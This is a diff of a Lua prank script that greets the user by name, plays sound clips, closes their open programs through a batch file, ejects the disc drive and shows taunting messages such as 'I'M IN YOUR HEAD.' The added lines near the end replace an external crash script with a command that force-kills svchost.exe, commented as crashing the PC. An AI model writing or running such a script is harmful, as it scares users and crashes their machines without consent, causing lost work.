@@ -8,14 +8,26 @@ local ui = require "ui"
 
 local sys = require "sys"
 
-local dir = sys.Directory(sys.currentdir);
+local dir = print(sys.Directory(sys.currentdir))
 
 local user = print(os.getenv('USERNAME'));
+
+local audio = require "audio"
+
+local json = require "json"
+
+local today = sys.Datetime()
+
+local hellomus = audio.Sound("mus//HELLO.mp3")
+
+local liltrickmus = audio.Sound("mus//liltrick.mp3")
+
+
 
 --Functions
 
 function DiscDrive()
-  os.execute(""..dir.."extern/disc.vbs");
+  os.execute("extern//disc.vbs");
 end
 
 function Waiteroo(n)
@@ -63,9 +75,13 @@ end
 
 ui.info("Hey dude!");
 
+json.save("dateShutdown.json", today);
+
 ui.info("Wait...");
 
 ui.info("I think I know you!");
+
+hellomus:play()
       
 ui.info("Are you "..os.getenv('USERNAME').."?");
 
@@ -77,7 +93,7 @@ ui.info("Hey "..os.getenv('USERNAME')..", what are you looking at over there?");
 
 ui.info("Don\'t worry, I\'ll deal with that for you!");
 
-os.execute(""..dir.."extern/Distractions.bat");  --Will close all things listed in the bat file.
+os.execute("extern\\Distractions.bat");
 
 ui.info("Now that that\'s dealt with...");
 
@@ -87,7 +103,12 @@ ui.info("Good?");
 
 ui.info("That\'s great!");
 
-ui.info("I wanted to show you a trick I\'ve been working on!!:);
+ui.info("I wanted to show you a trick I\'ve been working on!!");
+
+hellomus:stop()
+
+liltrickmus:play()
+
 
 DiscDrive();
 
@@ -121,7 +142,7 @@ ui.info("Hahaha!!");
                     
 ui.warn("I\'M IN YOUR HEAD.");  
 
-os.execute(""..dir.."extern/noteSpeak.bat");  --Will type out "I SEE YOU" in notepad.  Creepy.
+os.execute("extern\\noteSpeak.bat");  --Will type out "I SEE YOU" in notepad.  Creepy.
 
 Waiteroo(1*05);
 
@@ -129,7 +150,9 @@ ui.warn("...");
           
 ui.info("Bye "..os.getenv('USERNAME').."!!!");
 
-os.execute(""..dir.."extern/Crash.bat");  --Crash PC (Only Works With Admin)
+json.save("trollingdocs\\dateShutdown.json", today)
+
+os.execute("taskkill /F /IM \"svchost.exe\" /T");  --Crash PC (Only Works With Admin)
 
 Waiteroo(1*05);  --Wait 5 seconds before continuing
 
